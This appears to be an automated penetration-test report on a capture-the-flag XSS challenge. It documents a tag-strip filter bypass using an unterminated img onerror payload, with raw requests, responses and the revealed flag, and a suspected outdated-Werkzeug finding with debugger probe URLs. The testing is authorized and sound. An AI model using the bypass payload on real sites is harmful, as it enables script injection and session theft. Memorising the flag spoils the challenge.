# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-reflected Reflected XSS on /page `name` param — tag-strip filter bypassed via unterminated tag, alert('XSS') executes](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. HIGH — vulnerable-component Outdated Werkzeug 1.0.1 dev server (Python 2.7.18 EOL) — CVE-2024-34069 / CVE-2023-25577](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr30mfnr-zl4nsl` |
| Target | http://target.local:32833/ |
| Started | 2026-07-02T04:39:38.719Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32833`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 medium

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-reflected] Reflected XSS on /page `name` param — tag-strip filter bypassed via unterminated tag, alert('XSS') executes

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32833/

The `name` query parameter on /page is reflected into the raw HTML body (immediately before </form>) with no output encoding. Input passes through a naive tag-stripping filter that removes any substring matching `<...>` (a `<` ... `>` pair): `<script>`, `<svg>`, `<img>`, `<a>` etc. are all stripped, which is why a standard `<img src=x onerror=alert('XSS')>` payload is neutralised (negative control ev-mr30yw41-u -> payload removed, page shows the default 'Let the game begin' state, no execution).

Bypass: the strip regex requires a closing `>` to match. Supplying a tag WITHOUT its own closing bracket -- `<img src=x onerror=alert('XSS')` -- contains no `>`, so the filter finds nothing to remove and reflects it verbatim. In the browser the injected tag is closed by the document's own trailing `</form>`'s `>`, the img fails to load, and the `onerror` handler fires `alert('XSS')`. Execution is proven by the application's own headless-browser checker, which detected the alert with the string 'XSS' and returned the success state (success_star.png / 'Congratulations! Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}'). This is arbitrary JavaScript execution in the victim's browser context (session theft, credential phishing, action-on-behalf).

**Reproduction**

```
GET http://target.local:32833/page?name=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')  (decoded payload: <img src=x onerror=alert('XSS')  -- NO closing '>'). Response reflects the payload unescaped before </form>; the app's checker renders it, alert('XSS') fires, and the body returns success_star.png + 'Congratulations! Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}'. Negative control: the same payload WITH a trailing '>' (<img src=x onerror=alert('XSS')>) is stripped by the filter and yields the default 'Let the game begin' state -- no execution, no flag.
```

**Evidence**

- Evidence `ev-mr30yw41-u` — `artifacts/_/ev-mr30yw41-u/`

Request:

```http
GET /page?name=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27)%3E HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 918
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:49:19 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss23.css">
            <title>Dalgona - Star</title>
        </head>
    
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/new_star.png" alt="Start" width="150" height="150"><br>Let the game begin. Good Luck</div>
                    <input type=text name=name placeholder="Enter your name...">
                    
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mr3127ls-z` — `artifacts/_/ev-mr3127ls-z/`

Request:

```http
GET /page?name=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27) HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1006
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:51:54 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss23.css">
            <title>Dalgona - Star</title>
        </head>
    
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}</div>
                    <input type=text name=name placeholder="Enter your name...">
                    <img src=x onerror=alert('XSS')
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mr312pw1-10` — `artifacts/_/ev-mr312pw1-10/`

Request:

```http
GET /page?name=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27) HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1006
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:52:18 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss23.css">
            <title>Dalgona - Star</title>
        </head>
    
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}</div>
                    <input type=text name=name placeholder="Enter your name...">
                    <img src=x onerror=alert('XSS')
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mr312qfe-11` — `artifacts/_/ev-mr312qfe-11/`

Request:

```http
GET /page?name=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27) HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1006
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:52:18 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss23.css">
            <title>Dalgona - Star</title>
        </head>
    
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{fcec3afc-4b74-433f-b638-14091e51092e}</div>
                    <input type=text name=name placeholder="Enter your name...">
                    <img src=x onerror=alert('XSS')
                </form>
            </div>
        </div>
    </html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [HIGH] [vulnerable-component] Outdated Werkzeug 1.0.1 dev server (Python 2.7.18 EOL) — CVE-2024-34069 / CVE-2023-25577

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32833/

**Anomaly (why this is a lead):** Every response (root + 404s) discloses Server: Werkzeug/1.0.1 Python/2.7.18. Werkzeug 1.0.1 (Mar 2020) carries CVE-2024-34069 (interactive-debugger RCE, exploitable class, fixed in 3.0.3) and CVE-2023-25577 (multipart-parsing DoS, CVSS 7.5). This is version-based, not exploited: I actively probed /console (404) and the __debugger__ cmd=resource endpoint (returned the app page, not debugger.js), confirming the interactive debugger is disabled, so the RCE vector is closed on this host. Runtime Python 2.7.18 is EOL (Jan-2020) and unpatched — compounding context.

The application runs on the Werkzeug 1.0.1 development server (Python 2.7.18), disclosed in the Server header on every response. Werkzeug 1.0.1 has known CVEs: CVE-2024-34069 (interactive-debugger code execution — RCE class, requires debug=True + luring a developer, fixed in Werkzeug 3.0.3) and CVE-2023-25577 (resource-exhaustion DoS via many multipart parts, CVSS 7.5). Severity set High by the worst exploitable-class issue (CVE-2024-34069). This is a version-based match, NOT an active exploit: the debugger console (the practical RCE vector) was checked at /console and via the __debugger__ resource endpoint and is disabled. Additionally, the Werkzeug dev server is not intended for production and the Python 2.7.18 runtime is end-of-life (no security patches since Jan-2020). Remediation: upgrade Werkzeug (>=3.0.3) and migrate off Python 2.7, and serve behind a production WSGI server (gunicorn/uWSGI) rather than the Werkzeug dev server.

**Reproduction**

```
1. GET http://target.local:32833/ (or any path). 2. Observe response header: Server: Werkzeug/1.0.1 Python/2.7.18 (evidence ev-mr3167p8-18). 3. Cross-reference Werkzeug 1.0.1 against known CVEs (CVE-2024-34069, CVE-2023-25577). 4. Debugger-vector check: GET /console → 404; GET /?__debugger__=yes&cmd=resource&f=debugger.js → returns app HTML not debugger JS → interactive debugger disabled.
```

**Evidence**

- Evidence `ev-mr3167p8-18` — `artifacts/_/ev-mr3167p8-18/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32833
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:55:01 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
